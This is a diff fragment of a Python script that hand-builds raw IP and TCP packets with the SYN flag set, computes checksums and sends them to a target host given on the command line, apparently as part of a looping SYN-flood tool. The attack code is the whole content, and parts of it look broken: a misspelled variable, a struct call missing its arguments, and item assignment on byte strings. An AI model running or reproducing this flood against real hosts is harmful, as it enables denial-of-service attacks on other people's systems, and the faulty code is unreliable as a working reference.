@@ -33,3 +33,16 @@ iphdr += b'\x80\x06\x00\x00' # TTL + PROTOL + HDR_CKSUM
 iphdr += struct.pack('>I4s', srcIP, target)
 # to make TCP hdr
 tcphdr = struct.pack('>HH')
+tcphr = struct.pack('>HHII', srcPort, 80, random.randint(0,2**32-1), 0)
+tcphdr += b'\x50\x02\x44\x55'
+tcphdr += b'\x00\x00\x00\x00' # WIN_SIZE + TCP_CKSUM + URG_PTR
+
+pseudo_iphdr = iphdr[12:] + b'\x00\x06\x00\x14'
+chsum_tcp = checksum(pseudo_iphdr+tcphdr)
+chsum_ip = checksum(iphdr)
+iphdr[10] = chsum_ip//256
+iphdr[11] = chsum_ip%256
+tcphdr[16] = chsum_tcp//256
+tcphdr[17] = chsum_tcp%256
+s.sendto(iphdr+tcphdr, (sys.argv[1], 0))
+count+=1
